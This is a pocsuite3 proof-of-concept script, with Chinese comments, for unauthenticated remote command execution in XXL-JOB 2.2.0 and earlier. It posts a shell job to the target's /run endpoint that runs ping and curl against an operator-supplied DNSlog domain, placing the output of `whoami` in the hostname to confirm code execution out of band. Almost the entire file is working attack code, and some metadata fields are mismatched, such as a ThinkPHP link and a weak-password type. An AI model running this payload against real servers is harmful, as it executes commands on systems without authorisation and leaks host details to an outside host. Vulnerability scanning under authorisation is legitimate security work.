"""
作者 charis
时间 2022-12-30
注意 使用建议使用单个线程
"""
import time

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.modules.dnslog import Dnslog
from pocsuite3.modules.encryption import Encryption
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '2'  # ssvid
    version = '1.0'
    author = ['charis']
    vulDate = '未知'
    createDate = '2022-12-30'
    updateDate = '2022-12-30'
    references = ['https://github.com/DawnFlame/POChouse/tree/main/XXLjob']
    name = 'XXL-JOB 未授权RCE'
    appPowerLink = 'http://www.thinkphp.cn/'
    appName = 'XXL-JOB'
    appVersion = 'XXL-JOB <= 2.2.0'
    vulType = VUL_TYPE.WEAK_PASSWORD
    desc = '''XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。弱口令检测'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    #自定义dnslog

    def _options(self):
        o = OrderedDict()
        o["domain"] = OptString('', description='自定义dnslog 目前支持revsuit平台', require=True)  #用户输入
        return o

    # 定义检查方法
    def _check(self, url):
        flag = r'{"code":200}'
        # domain = "dj2d1r.dnslog.cn" #配置dnslog服务器
        domain = self.get_option("domain") #配置自定义dnslog服务器
        #c9为密钥url是为了定位存在漏洞目标
        payloads = [
            f"ping -nc 1 c9{Encryption().md5(url)}.`whoami`.{domain}",
            f"curl c9{Encryption().md5(url)}.`whoami`.{domain}"
        ]

        for payload in payloads:
            vul_url = url + '/run'

            headers = {
                "Accept-Encoding": "gzip, deflate",
                "Accept": "*/*",
                "Accept-Language": "en",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
                "Connection": "close",
                "Content-Type": "application/json"
            }

            data = r'''{
            "jobId": 1,
            "executorHandler": "demoJobHandler",
            "executorParams": "demoJobHandler",
            "executorBlockStrategy": "COVER_EARLY",
            "executorTimeout": 0,
            "logId": 1,
            "logDateTime": 1586629003729,
            "glueType": "GLUE_SHELL",
            "glueSource": "''' + payload + '''",
            "glueUpdatetime": 1586699003758,
            "broadcastIndex": 0,
            "broadcastTotal": 0
            }'''

            try:
                r = requests.post(vul_url, data=data, headers=headers)
                if r.status_code == 200:
                    if flag in r.text:
                        time.sleep(1)  # 等待服务器响应时间
                        try:
                            pass
                            dnslog = Dnslog().getDns(url, domain)  # 监视dnslog服务器默认1秒一次

                        except:
                            pass
                        if dnslog:
                            return url, payload, dnslog, data
            except requests.exceptions.RequestException as e:
                pass
        return False

    def _verify(self):

        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['payload'] = p[1]
            result['VerifyInfo']['dns外带结果'] = p[2]
            result['VerifyInfo']['Postdata'] = p[3]
        return self.parse_output(result)

    def _attack(self):
        exit("无需获取shell")

    def _shell(self):
        exit("无需获取shell")


    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
